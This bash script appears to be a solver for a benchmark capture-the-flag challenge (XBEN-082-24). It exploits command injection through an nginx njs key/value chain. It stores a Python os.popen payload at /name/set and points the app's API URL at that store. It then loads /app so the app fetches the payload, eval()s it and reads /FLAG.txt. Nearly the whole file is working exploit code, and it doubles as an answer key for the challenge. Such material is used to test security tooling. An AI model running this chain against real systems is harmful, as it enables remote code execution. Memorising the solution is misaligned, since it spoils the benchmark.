#!/usr/bin/env bash
# XBEN-082-24 — command injection through an nginx njs chain. Proxy-mode twin.
# /app asks nginx where the API is, fetches that URL, and eval()s the `script`
# field of the JSON it gets back. nginx's njs /name/set stores arbitrary text
# and /name returns it. So: store the payload at /name, point the API URL at
# http://nginx/name, then load /app — it fetches and evaluates the payload.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben082p-$$"; cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"; go "$URL/"; BASE="$(req_of GET /)"
PAYLOAD='{"script":"__import__('"'"'os'"'"').popen('"'"'cat /FLAG.txt'"'"').read()"}'
# 1. store the payload in nginx's njs key/value store
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/name/set' --set "query.name=$PAYLOAD" >/dev/null
# 2. point the app's API URL at that store
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set 'method=GET' --set 'path=/api/set' --set 'query.url=http://nginx/name' >/dev/null
# 3. load /app: it fetches the API URL and evaluates the script -> flag
"$H5I" websec replay "$BASE" --create --session "$SESSION" --set 'method=GET' --set 'path=/app' >/dev/null
print_flag
